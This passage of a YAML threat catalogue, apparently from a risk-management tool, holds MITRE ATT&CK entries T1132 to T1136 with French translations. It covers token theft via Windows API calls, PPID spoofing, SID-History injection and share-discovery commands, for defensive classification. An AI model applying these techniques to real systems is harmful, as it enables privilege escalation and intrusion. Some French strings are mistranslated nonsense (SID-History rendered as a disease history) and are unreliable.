          \ qui est appel\xE9e \xE0 partir de fonctions comme \xAB LoadLibrary \xBB\
          \ \xE0 l\u2019ex\xE9cution. (Citation : Microsoft DLL)\nhttps://attack.mitre.org/techniques/T1129"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1132
    ref_id: T1132
    name: Data Encoding
    description: 'Adversaries may encode data to make the content of command and control
      traffic more difficult to detect. Command and control (C2) information can be
      encoded using a standard data encoding system. Use of data encoding may adhere
      to existing protocol specifications and includes use of ASCII, Unicode, Base64,
      MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia
      Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data
      encoding systems may also result in data compression, such as gzip.

      https://attack.mitre.org/techniques/T1132'
    translations:
      fr:
        name: "Encodage des donn\xE9es"
        description: "Les adversaires peuvent encoder des donn\xE9es pour rendre le\
          \ contenu du trafic de commandement et de contr\xF4le plus difficile \xE0\
          \ d\xE9tecter. Les informations de commande et de contr\xF4le (C2) peuvent\
          \ \xEAtre encod\xE9es \xE0 l\u2019aide d\u2019un syst\xE8me standard d\u2019\
          encodage de donn\xE9es. L\u2019utilisation de l\u2019encodage des donn\xE9\
          es peut respecter les sp\xE9cifications de protocole existantes et inclut\
          \ l\u2019utilisation d\u2019ASCII, Unicode, Base64, MIME ou d\u2019autres\
          \ syst\xE8mes binaire-texte et d\u2019encodage de caract\xE8res. (Citation\
          \ : Encodage binaire-texte Wikip\xE9dia) (Citation : Encodage de caract\xE8\
          res Wikip\xE9dia) Certains syst\xE8mes d\u2019encodage de donn\xE9es peuvent\
          \ \xE9galement entra\xEEner une compression de donn\xE9es, comme gzip.\n\
          https://attack.mitre.org/techniques/T1132"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1132.001
    ref_id: T1132.001
    name: Standard Encoding
    description: 'Adversaries may encode data with a standard data encoding system
      to make the content of command and control traffic more difficult to detect.
      Command and control (C2) information can be encoded using a standard data encoding
      system that adheres to existing protocol specifications. Common data encoding
      schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia
      Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding
      systems may also result in data compression, such as gzip.

      https://attack.mitre.org/techniques/T1132/001'
    translations:
      fr:
        name: Encodage standard
        description: "Les adversaires peuvent encoder les donn\xE9es avec un syst\xE8\
          me standard de codage pour rendre le contenu du trafic de commandement et\
          \ de contr\xF4le plus difficile \xE0 d\xE9tecter. Les informations de commande\
          \ et de contr\xF4le (C2) peuvent \xEAtre encod\xE9es \xE0 l\u2019aide d\u2019\
          un syst\xE8me standard de codage de donn\xE9es qui respecte les sp\xE9cifications\
          \ de protocole existantes. Les sch\xE9mas de codage de donn\xE9es courants\
          \ incluent ASCII, Unicode, hexad\xE9cimal, Base64 et MIME. (Citation : Encodage\
          \ binaire-texte Wikip\xE9dia)(Citation : Encodage de caract\xE8res Wikip\xE9\
          dia) Certains syst\xE8mes d\u2019encodage de donn\xE9es peuvent \xE9galement\
          \ entra\xEEner une compression de donn\xE9es, comme gzip.\nhttps://attack.mitre.org/techniques/T1132/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1132.002
    ref_id: T1132.002
    name: Non-Standard Encoding
    description: 'Adversaries may encode data with a non-standard data encoding system
      to make the content of command and control traffic more difficult to detect.
      Command and control (C2) information can be encoded using a non-standard data
      encoding system that diverges from existing protocol specifications. Non-standard
      data encoding schemes may be based on or related to standard data encoding schemes,
      such as a modified Base64 encoding for the message body of an HTTP request.(Citation:
      Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding)

      https://attack.mitre.org/techniques/T1132/002'
    translations:
      fr:
        name: Encodage non standard
        description: "Les adversaires peuvent encoder des donn\xE9es avec un syst\xE8\
          me d\u2019encodage non standard afin de rendre le contenu du trafic de commande\
          \ et de contr\xF4le plus difficile \xE0 d\xE9tecter. Les informations de\
          \ commande et de contr\xF4le (C2) peuvent \xEAtre encod\xE9es \xE0 l\u2019\
          aide d\u2019un syst\xE8me d\u2019encodage de donn\xE9es non standard qui\
          \ diverge des sp\xE9cifications existantes du protocole. Les sch\xE9mas\
          \ d\u2019encodage de donn\xE9es non standards peuvent \xEAtre bas\xE9s sur\
          \ ou li\xE9s \xE0 des sch\xE9mas d\u2019encodage de donn\xE9es standards,\
          \ tels qu\u2019un codage Base64 modifi\xE9 pour le corps du message d\u2019\
          une requ\xEAte HTTP. (Citation : Encodage binaire-texte Wikip\xE9dia)(Citation\
          \ : Encodage de caract\xE8res Wikip\xE9dia)\nhttps://attack.mitre.org/techniques/T1132/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1133
    ref_id: T1133
    name: External Remote Services
    description: "Adversaries may leverage external-facing remote services to initially\
      \ access and/or persist within a network. Remote services such as VPNs, Citrix,\
      \ and other access mechanisms allow users to connect to internal enterprise\
      \ network resources from external locations. There are often remote service\
      \ gateways that manage connections and credential authentication for these services.\
      \ Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)\
      \ and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used\
      \ externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to\
      \ [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service\
      \ is often a requirement, which could be obtained through credential pharming\
      \ or by obtaining the credentials from users after compromising the enterprise\
      \ network.(Citation: Volexity Virtual Private Keylogging) Access to remote services\
      \ may be used as a redundant or persistent access mechanism during an operation.\n\
      \nAccess may also be gained through an exposed service that doesn\u2019t require\
      \ authentication. In containerized environments, this may include an exposed\
      \ Docker API, Kubernetes API server, kubelet, or web application such as the\
      \ Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation:\
      \ Unit 42 Hildegard Malware)\n\nAdversaries may also establish persistence on\
      \ network by configuring a Tor hidden service on a compromised system. Adversaries\
      \ may utilize the tool `ShadowLink` to facilitate the installation and configuration\
      \ of the Tor hidden service. Tor hidden service is then accessible via the Tor\
      \ network because `ShadowLink` sets up a .onion address on the compromised system.\
      \ `ShadowLink` may be used to forward any inbound connections to RDP, allowing\
      \ the adversaries to have remote access.(Citation: The BadPilot campaign) Adversaries\
      \ may get `ShadowLink` to persist on a system by masquerading it as an MS Defender\
      \ application.(Citation: Russian threat actors dig in, prepare to seize on war\
      \ fatigue)\nhttps://attack.mitre.org/techniques/T1133"
    translations:
      fr:
        name: "Services externes \xE0 distance"
        description: "Les adversaires peuvent exploiter des services \xE0 distance\
          \ externes pour acc\xE9der initialement et/ou persister au sein d\u2019\
          un r\xE9seau. Les services distants tels que les VPN, Citrix et autres m\xE9\
          canismes d\u2019acc\xE8s permettent aux utilisateurs de se connecter aux\
          \ ressources r\xE9seau internes de l\u2019entreprise depuis des emplacements\
          \ externes. Il existe souvent des passerelles de service distantes qui g\xE8\
          rent les connexions et l\u2019authentification des identifiants pour ces\
          \ services. Des services tels que [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)\
          \ et [VNC](https://attack.mitre.org/techniques/T1021/005) peuvent \xE9galement\
          \ \xEAtre utilis\xE9s en externe. (Citation : Logiciel VNC MacOS pour bureau\
          \ \xE0 distance)\n\nL\u2019acc\xE8s aux [comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour utiliser le service est souvent une exigence, qui peut \xEAtre obtenue\
          \ par le phishing des identifiants ou en obtenant les identifiants aupr\xE8\
          s des utilisateurs apr\xE8s avoir compromis le r\xE9seau d\u2019entreprise.\
          \ (Citation : Keylogging priv\xE9 virtuel Volexity) L\u2019acc\xE8s aux\
          \ services \xE0 distance peut \xEAtre utilis\xE9 comme un m\xE9canisme d\u2019\
          acc\xE8s redondant ou persistant pendant une op\xE9ration.\n\nL\u2019acc\xE8\
          s peut \xE9galement \xEAtre obtenu via un service expos\xE9 qui ne n\xE9\
          cessite pas d\u2019authentification. Dans les environnements conteneuris\xE9\
          s, cela peut inclure une API Docker expos\xE9e, un serveur API Kubernetes,\
          \ un kubelet ou une application web telle que le tableau de bord Kubernetes.\
          \ (Citation : Serveur Docker Expos\xE9 de Trend Micro)(Citation : Unit\xE9\
          \ 42 Malware Hildegard)\n\nLes adversaires peuvent \xE9galement \xE9tablir\
          \ la persistance sur le r\xE9seau en configurant un service cach\xE9 Tor\
          \ sur un syst\xE8me compromis. Les adversaires peuvent utiliser l\u2019\
          outil \xAB ShadowLink \xBB pour faciliter l\u2019installation et la configuration\
          \ du service cach\xE9 Tor. Le service cach\xE9 Tor est alors accessible\
          \ via le r\xE9seau Tor car \xAB ShadowLink \xBB configure une adresse .onion\
          \ sur le syst\xE8me compromis. \xAB ShadowLink \xBB peut \xEAtre utilis\xE9\
          \ pour transmettre toute connexion entrante vers RDP, permettant ainsi aux\
          \ adversaires d\u2019avoir un acc\xE8s \xE0 distance. (Citation : La campagne\
          \ BadPilot) Les adversaires peuvent faire persister \xAB ShadowLink \xBB\
          \ sur un syst\xE8me en le faisant passer pour une application MS Defender.\
          \ (Citation : Les acteurs de menace russes s\u2019installent, se pr\xE9\
          parent \xE0 profiter de la fatigue de guerre)\nhttps://attack.mitre.org/techniques/T1133"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134
    ref_id: T1134
    name: Access Token Manipulation
    description: 'Adversaries may modify access tokens to operate under a different
      user or system security context to perform actions and bypass access controls.
      Windows uses access tokens to determine the ownership of a running process.
      A user can manipulate access tokens to make a running process appear as though
      it is the child of a different process or belongs to someone other than the
      user that started the process. When this occurs, the process also takes on the
      security context associated with the new token.


      An adversary can use built-in Windows API functions to copy access tokens from
      existing processes; this is known as token stealing. These token can then be
      applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001))
      or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)).
      An adversary must already be in a privileged user context (i.e. administrator)
      to steal a token. However, adversaries commonly use token stealing to elevate
      their security context from the administrator level to the SYSTEM level. An
      adversary can then use a token to authenticate to a remote system as the account
      for that token if the account has appropriate permissions on the remote system.(Citation:
      Pentestlab Token Manipulation)


      Any standard user can use the <code>runas</code> command, and the Windows API
      functions, to create impersonation tokens; it does not require access to an
      administrator account. There are also other mechanisms, such as Active Directory
      fields, that can be used to modify access tokens.'
    translations:
      fr:
        name: "Manipulation des jetons d\u2019acc\xE8s"
        description: "Les adversaires peuvent modifier les jetons d\u2019acc\xE8s\
          \ pour qu\u2019ils fonctionnent dans un autre contexte de s\xE9curit\xE9\
          \ utilisateur ou syst\xE8me afin d\u2019effectuer des actions et de contourner\
          \ les contr\xF4les d\u2019acc\xE8s. Windows utilise des jetons d\u2019acc\xE8\
          s pour d\xE9terminer la propri\xE9t\xE9 d\u2019un processus en cours. Un\
          \ utilisateur peut manipuler des jetons d\u2019acc\xE8s pour faire para\xEE\
          tre un processus en cours d\u2019ex\xE9cution comme l\u2019enfant d\u2019\
          un autre processus ou appartenant \xE0 quelqu\u2019un d\u2019autre que l\u2019\
          utilisateur qui a lanc\xE9 le processus. Lorsque cela se produit, le processus\
          \ prend \xE9galement en charge le contexte de s\xE9curit\xE9 associ\xE9\
          \ au nouveau jeton.\n\nUn adversaire peut utiliser les fonctions int\xE9\
          gr\xE9es de l\u2019API Windows pour copier des jetons d\u2019acc\xE8s des\
          \ processus existants ; Ceci est connu sous le nom de vol de jetons. Ces\
          \ jetons peuvent ensuite \xEAtre appliqu\xE9s \xE0 un processus existant\
          \ (c\u2019est-\xE0-dire [Usurpation d\u2019identit\xE9/vol de jeton](https://attack.mitre.org/techniques/T1134/001))\
          \ ou utilis\xE9s pour g\xE9n\xE9rer un nouveau processus (par exemple [Cr\xE9\
          er un processus avec jeton](https://attack.mitre.org/techniques/T1134/002)).\
          \ Un adversaire doit d\xE9j\xE0 se trouver dans un contexte utilisateur\
          \ privil\xE9gi\xE9 (c\u2019est-\xE0-dire un administrateur) pour voler un\
          \ jeton. Cependant, les adversaires utilisent couramment le vol de jetons\
          \ pour \xE9lever leur contexte de s\xE9curit\xE9 du niveau administrateur\
          \ au niveau SYST\xC8ME. Un adversaire peut alors utiliser un jeton pour\
          \ s\u2019authentifier \xE0 un syst\xE8me distant comme compte pour ce jeton\
          \ si le compte dispose des permissions appropri\xE9es sur le syst\xE8me\
          \ distant. (Citation : Manipulation du jeton Pentestlab)\n\nTout utilisateur\
          \ standard peut utiliser la commande <code>runas</code>, ainsi que les fonctions\
          \ de l\u2019API Windows, pour cr\xE9er des jetons d\u2019usurpation d\u2019\
          identit\xE9 ; il ne n\xE9cessite pas d\u2019acc\xE8s \xE0 un compte administrateur.\
          \ Il existe \xE9galement d\u2019autres m\xE9canismes, comme des champs Active\
          \ Directory, qui peuvent \xEAtre utilis\xE9s pour modifier les jetons d\u2019\
          acc\xE8s."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134.001
    ref_id: T1134.001
    name: Token Impersonation/Theft
    description: 'Adversaries may duplicate then impersonate another user''s existing
      token to escalate privileges and bypass access controls. For example, an adversary
      can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation:
      DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser`
      to allow the calling thread to impersonate a logged on user''s security context,
      or with `SetThreadToken` to assign the impersonated token to a thread.


      An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)
      when they have a specific, existing process they want to assign the duplicated
      token to. For example, this may be useful for when the target user has a non-network
      logon session on the system.


      When an adversary would instead use a duplicated token to create a new process
      rather than attaching to an existing process, they can additionally [Create
      Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW`
      or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)
      is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003)
      in that it refers to duplicating an existing token, rather than creating a new
      one.'
    translations:
      fr:
        name: "Usurpation d\u2019identit\xE9 de jeton/vol"
        description: "Les adversaires peuvent dupliquer puis usurper l\u2019identit\xE9\
          \ du jeton existant d\u2019un autre utilisateur pour escalader les privil\xE8\
          ges et contourner les contr\xF4les d\u2019acc\xE8s. Par exemple, un adversaire\
          \ peut dupliquer un jeton existant en utilisant \xAB DuplicateToken \xBB\
          \ ou \xAB DuplicateTokenEx \xBB. (Citation : fonction DuplicateToken) Le\
          \ jeton peut ensuite \xEAtre utilis\xE9 avec \xAB ImpersonateLoggedOnUser\
          \ \xBB pour permettre au thread appelant d\u2019imiter le contexte de s\xE9\
          curit\xE9 d\u2019un utilisateur connect\xE9, ou avec \xAB SetThreadToken\
          \ \xBB pour assigner le jeton usurp\xE9 \xE0 un thread.\n\nUn adversaire\
          \ peut effectuer [Usurpation de Nom/Vol de Jeton](https://attack.mitre.org/techniques/T1134/001)\
          \ lorsqu\u2019il dispose d\u2019un processus sp\xE9cifique et existant auquel\
          \ il souhaite attribuer le jeton dupliqu\xE9. Par exemple, cela peut \xEA\
          tre utile lorsque l\u2019utilisateur cible a une session de connexion hors\
          \ r\xE9seau sur le syst\xE8me.\n\nLorsqu\u2019un adversaire utiliserait\
          \ plut\xF4t un jeton dupliqu\xE9 pour cr\xE9er un nouveau processus au lieu\
          \ de l\u2019attacher \xE0 un processus existant, il peut en plus [Cr\xE9\
          er un processus avec un jeton](https://attack.mitre.org/techniques/T1134/002)\
          \ en utilisant \xAB CreateProcessWithTokenW \xBB ou \xAB CreateProcessAsUserW\
          \ \xBB. [Usurpation de personnage/vol symbolique](https://attack.mitre.org/techniques/T1134/001)\
          \ se distingue \xE9galement de [Cr\xE9er et Imiter un Jeton](https://attack.mitre.org/techniques/T1134/003)\
          \ en ce qu\u2019il fait r\xE9f\xE9rence \xE0 la duplication d\u2019un jeton\
          \ existant, plut\xF4t qu\u2019\xE0 la cr\xE9ation d\u2019un nouveau."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134.002
    ref_id: T1134.002
    name: Create Process with Token
    description: 'Adversaries may create a new process with an existing token to escalate
      privileges and bypass access controls. Processes can be created with the token
      and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code>
      and <code>runas</code>.(Citation: Microsoft RunAs)


      Creating processes with a token not associated with the current user may require
      the credentials of the target user, specific privileges to impersonate that
      user, or access to the token to be used. For example, the token could be duplicated
      via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)
      or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003)
      before being used to create a process.


      While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001),
      the techniques can be used in conjunction where a token is duplicated and then
      used to create a new process.

      https://attack.mitre.org/techniques/T1134/002'
    translations:
      fr:
        name: "Cr\xE9er un processus avec un jeton"
        description: "Les adversaires peuvent cr\xE9er un nouveau processus avec un\
          \ jeton existant pour augmenter les privil\xE8ges et contourner les contr\xF4\
          les d\u2019acc\xE8s. Les processus peuvent \xEAtre cr\xE9\xE9s avec le jeton\
          \ et le contexte de s\xE9curit\xE9 r\xE9sultant d\u2019un autre utilisateur\
          \ en utilisant des fonctionnalit\xE9s telles que <code>CreateProcessWithTokenW</code>\
          \ et <code>runas</code>. (Citation : Microsoft RunAs)\n\nLa cr\xE9ation\
          \ de processus avec un jeton non associ\xE9 \xE0 l\u2019utilisateur actuel\
          \ peut n\xE9cessiter les identifiants de l\u2019utilisateur cible, des privil\xE8\
          ges sp\xE9cifiques pour usurper l\u2019identit\xE9 de cet utilisateur, ou\
          \ l\u2019acc\xE8s au jeton \xE0 utiliser. Par exemple, le jeton pourrait\
          \ \xEAtre dupliqu\xE9 via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)\
          \ ou cr\xE9\xE9 via [Cr\xE9er et Imiter Jeton](https://attack.mitre.org/techniques/T1134/003)\
          \ avant d\u2019\xEAtre utilis\xE9 pour cr\xE9er un processus.\n\nBien que\
          \ cette technique soit distincte de [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001),\
          \ ces techniques peuvent \xEAtre utilis\xE9es conjointement lorsqu\u2019\
          un jeton est dupliqu\xE9 puis utilis\xE9 pour cr\xE9er un nouveau processus.\n\
          https://attack.mitre.org/techniques/T1134/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134.003
    ref_id: T1134.003
    name: Make and Impersonate Token
    description: 'Adversaries may make new tokens and impersonate users to escalate
      privileges and bypass access controls. For example, if an adversary has a username
      and password but the user is not logged onto the system the adversary can then
      create a logon session for the user using the `LogonUser` function.(Citation:
      LogonUserW function) The function will return a copy of the new session''s access
      token and the adversary can use `SetThreadToken` to assign the token to a thread.


      This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)
      in that this refers to creating a new user token instead of stealing or duplicating
      an existing one.

      https://attack.mitre.org/techniques/T1134/003'
    translations:
      fr:
        name: "Cr\xE9er et usurper l\u2019identit\xE9 du jeton"
        description: "Les adversaires peuvent cr\xE9er de nouveaux jetons et se faire\
          \ passer pour des utilisateurs afin d\u2019augmenter les privil\xE8ges et\
          \ de contourner les contr\xF4les d\u2019acc\xE8s. Par exemple, si un adversaire\
          \ a un nom d\u2019utilisateur et un mot de passe mais que l\u2019utilisateur\
          \ n\u2019est pas connect\xE9 au syst\xE8me, l\u2019adversaire peut alors\
          \ cr\xE9er une session de connexion pour l\u2019utilisateur en utilisant\
          \ la fonction \xAB LogonUser \xBB. (Citation : fonction LogonUserW) La fonction\
          \ renverra une copie du jeton d\u2019acc\xE8s de la nouvelle session et\
          \ l\u2019adversaire peut utiliser \xAB SetThreadToken \xBB pour assigner\
          \ le jeton \xE0 un thread.\n\nCe comportement se distingue de [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)\
          \ en ce qu\u2019il s\u2019agit de cr\xE9er un nouveau jeton utilisateur\
          \ au lieu de voler ou dupliquer un jeton existant.\nhttps://attack.mitre.org/techniques/T1134/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134.004
    ref_id: T1134.004
    name: Parent PID Spoofing
    description: 'Adversaries may spoof the parent process identifier (PPID) of a
      new process to evade process-monitoring defenses or to elevate privileges. New
      processes are typically spawned directly from their parent, or calling, process
      unless explicitly specified. One way of explicitly assigning the PPID of a new
      process is via the <code>CreateProcess</code> API call, which supports a parameter
      that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009)
      This functionality is used by Windows features such as User Account Control
      (UAC) to correctly set the PPID after a requested elevated process is spawned
      by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>)
      rather than the current user context.(Citation: Microsoft UAC Nov 2018)


      Adversaries may abuse these mechanisms to evade defenses, such as those blocking
      processes spawning directly from Office documents, and analysis targeting unusual/potentially
      malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011)
      to be <code>explorer.exe</code> rather than an Office document delivered as
      part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation:
      CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual
      Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office
      document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation:
      CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)


      Explicitly assigning the PPID may also enable elevated privileges given appropriate
      access rights to the parent process. For example, an adversary in a privileged
      user context (i.e. administrator) may spawn a new process and assign the parent
      as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the
      new process to be elevated via the inherited access token.(Citation: XPNSec
      PPID Nov 2017)

      https://attack.mitre.org/techniques/T1134/004'
    translations:
      fr:
        name: Usurpation PID parente
        description: "Les adversaires peuvent usurper l\u2019identifiant parent de\
          \ processus (PPID) d\u2019un nouveau processus afin d\u2019\xE9chapper aux\
          \ d\xE9fenses de surveillance des processus ou d\u2019augmenter des privil\xE8\
          ges. Les nouveaux processus sont g\xE9n\xE9ralement g\xE9n\xE9r\xE9s directement\
          \ \xE0 partir de leur processus parent ou appelant, sauf indication explicite.\
          \ Une fa\xE7on d\u2019attribuer explicitement le PPID d\u2019un nouveau\
          \ processus est via l\u2019appel <code>API CreateProcess</code>, qui prend\
          \ en charge un param\xE8tre d\xE9finissant le PPID \xE0 utiliser. (Citation\
          \ : DidierStevens SelectMyParent nov. 2009) Cette fonctionnalit\xE9 est\
          \ utilis\xE9e par des fonctionnalit\xE9s Windows telles que le Contr\xF4\
          le des comptes utilisateur (UAC) pour d\xE9finir correctement le PPID apr\xE8\
          s qu\u2019un processus \xE9lev\xE9 demand\xE9 a \xE9t\xE9 g\xE9n\xE9r\xE9\
          \ par SYSTEM (g\xE9n\xE9ralement via <code>svchost.exe</code> ou <code>consent.exe</code>)\
          \ plut\xF4t que dans le contexte utilisateur actuel. (Citation : Microsoft\
          \ UAC nov. 2018)\n\nLes adversaires peuvent abuser de ces m\xE9canismes\
          \ pour contourner les d\xE9fenses, comme ceux qui bloquent les processus\
          \ g\xE9n\xE9rant directement \xE0 partir de documents Office, et les analyses\
          \ ciblant les relations parent-enfant inhabituelles ou potentiellement malveillantes,\
          \ comme l\u2019usurpation du PPID de [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011)\
          \ pour <code>qu\u2019il soit explorer.exe</code> plut\xF4t qu\u2019un document\
          \ Office livr\xE9 dans le cadre de [Joint Spearphishing](https://attack.mitre.org/techniques/T1566/001).\
          \ (Citation : Usurpation PPID de CounterCept d\xE9c. 2018) Cette usurpation\
          \ pouvait \xEAtre ex\xE9cut\xE9e via [Visual Basic](https://attack.mitre.org/techniques/T1059/005)\
          \ dans un document Office malveillant ou tout code pouvant ex\xE9cuter une\
          \ [API native](https://attack.mitre.org/techniques/T1106). (Citation : CTD\
          \ PPID Spoofing Macro mars 2019)(Citation : Usurpation PPID de CounterCept\
          \ d\xE9c. 2018)\n\nL\u2019attribution explicite du PPID peut \xE9galement\
          \ permettre des privil\xE8ges \xE9lev\xE9s accordant des droits d\u2019\
          acc\xE8s appropri\xE9s au processus parent. Par exemple, un adversaire dans\
          \ un contexte utilisateur privil\xE9gi\xE9 (c\u2019est-\xE0-dire un administrateur)\
          \ peut g\xE9n\xE9rer un nouveau processus et assigner le parent comme un\
          \ processus ex\xE9cutant sous le nom SYSTEM (comme <code>lsass.exe</code>),\
          \ ce qui fait que le nouveau processus est \xE9lev\xE9 via le jeton d\u2019\
          acc\xE8s h\xE9rit\xE9. (Citation : XPNSec PPID nov. 2017)\nhttps://attack.mitre.org/techniques/T1134/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134.005
    ref_id: T1134.005
    name: SID-History Injection
    description: 'Adversaries may use SID-History Injection to escalate privileges
      and bypass access controls. The Windows security identifier (SID) is a unique
      value that identifies a user or group account. SIDs are used by Windows security
      in both security descriptors and access tokens. (Citation: Microsoft SID) An
      account can hold additional SIDs in the SID-History Active Directory attribute
      (Citation: Microsoft SID-History Attribute), allowing inter-operable account
      migration between domains (e.g., all values in SID-History are included in access
      tokens).


      With Domain Administrator (or equivalent) rights, harvested or well-known SID
      values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History
      to enable impersonation of arbitrary users/groups such as Enterprise Administrators.
      This manipulation may result in elevated access to local resources and/or access
      to otherwise inaccessible domains via lateral movement techniques such as [Remote
      Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002),
      or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).

      https://attack.mitre.org/techniques/T1134/005'
    translations:
      fr:
        name: "Injection d\u2019ant\xE9c\xE9dents de la maladie du sits"
        description: "Les adversaires peuvent utiliser l\u2019injection d\u2019historique\
          \ SID pour escalader les privil\xE8ges et contourner les contr\xF4les d\u2019\
          acc\xE8s. L\u2019identifiant de s\xE9curit\xE9 Windows (SID) est une valeur\
          \ unique qui identifie un compte utilisateur ou de groupe. Les SID sont\
          \ utilis\xE9s par la s\xE9curit\xE9 Windows \xE0 la fois dans les descripteurs\
          \ de s\xE9curit\xE9 et les jetons d\u2019acc\xE8s. (Citation : Microsoft\
          \ SID) Un compte peut contenir des SID suppl\xE9mentaires dans l\u2019attribut\
          \ Active Directory SID-History (citation : Attribut Microsoft SID-History),\
          \ permettant une migration interop\xE9rable de comptes entre domaines (par\
          \ exemple, toutes les valeurs de SID-History sont incluses dans les jetons\
          \ d\u2019acc\xE8s).\n\nAvec les droits d\u2019administrateur de domaine\
          \ (ou \xE9quivalent), des valeurs SID r\xE9colt\xE9es ou bien connues (Citation\
          \ : Microsoft Well Known SIDs juin 2017) peuvent \xEAtre ins\xE9r\xE9es\
          \ dans l\u2019historique SID pour permettre l\u2019usurpation d\u2019identit\xE9\
          \ d\u2019utilisateurs/groupes arbitraires tels que les administrateurs d\u2019\
          entreprise. Cette manipulation peut entra\xEEner un acc\xE8s accru aux ressources\
          \ locales et/ou \xE0 des domaines autrement inaccessibles via des techniques\
          \ de d\xE9placement lat\xE9ral telles que [Services Distantes](https://attack.mitre.org/techniques/T1021),\
          \ [Partages Administrateur SMB/Windows](https://attack.mitre.org/techniques/T1021/002)\
          \ ou [Gestion Distante Windows](https://attack.mitre.org/techniques/T1021/006).\n\
          https://attack.mitre.org/techniques/T1134/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1135
    ref_id: T1135
    name: Network Share Discovery
    description: "Adversaries may look for folders and drives shared on remote systems\
      \ as a means of identifying sources of information to gather as a precursor\
      \ for Collection and to identify potential systems of interest for Lateral Movement.\
      \ Networks often contain shared network drives and folders that enable users\
      \ to access file directories on various systems across a network. \n\nFile sharing\
      \ over a Windows network occurs over the SMB protocol. (Citation: Wikipedia\
      \ Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039)\
      \ can be used to query a remote system for available shared drives using the\
      \ <code>net view \\\\\\\\remotesystem</code> command. It can also be used to\
      \ query shared drives on the local system using <code>net share</code>. For\
      \ macOS, the <code>sharing -l</code> command lists all shared points used for\
      \ smb services.\nhttps://attack.mitre.org/techniques/T1135"
    translations:
      fr:
        name: "D\xE9couverte de la part de r\xE9seau"
        description: "Les adversaires peuvent rechercher des dossiers et des disques\
          \ partag\xE9s sur des syst\xE8mes distants afin d\u2019identifier des sources\
          \ d\u2019information \xE0 collecter en tant que pr\xE9curseur de la Collection\
          \ et d\u2019identifier des syst\xE8mes potentiels d\u2019int\xE9r\xEAt pour\
          \ le Mouvement Lat\xE9ral. Les r\xE9seaux contiennent souvent des disques\
          \ et dossiers r\xE9seau partag\xE9s qui permettent aux utilisateurs d\u2019\
          acc\xE9der \xE0 des r\xE9pertoires de fichiers sur divers syst\xE8mes du\
          \ r\xE9seau. \n\nLe partage de fichiers sur un r\xE9seau Windows se fait\
          \ via le protocole SMB. (Citation : Ressource partag\xE9e Wikip\xE9dia)\
          \ (Citation : Dossier partag\xE9 TechNet) [Net](https://attack.mitre.org/software/S0039)\
          \ peut \xEAtre utilis\xE9 pour interroger un syst\xE8me distant pour rechercher\
          \ des disques partag\xE9s disponibles via la <code>commande net view \\\\\
          \\\\remotesystem</code>. Il peut \xE9galement \xEAtre utilis\xE9 pour interroger\
          \ des disques partag\xE9s sur le syst\xE8me local via <code>net share</code>.\
          \ Pour macOS, la commande <code>-l de partage</code> liste tous les points\
          \ partag\xE9s utilis\xE9s pour les services smb.\nhttps://attack.mitre.org/techniques/T1135"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1136
    ref_id: T1136
    name: Create Account
    description: 'Adversaries may create an account to maintain access to victim systems.(Citation:
      Symantec WastedLocker June 2020) With a sufficient level of access, creating
      such accounts may be used to establish secondary credentialed access that do
      not require persistent remote access tools to be deployed on the system.


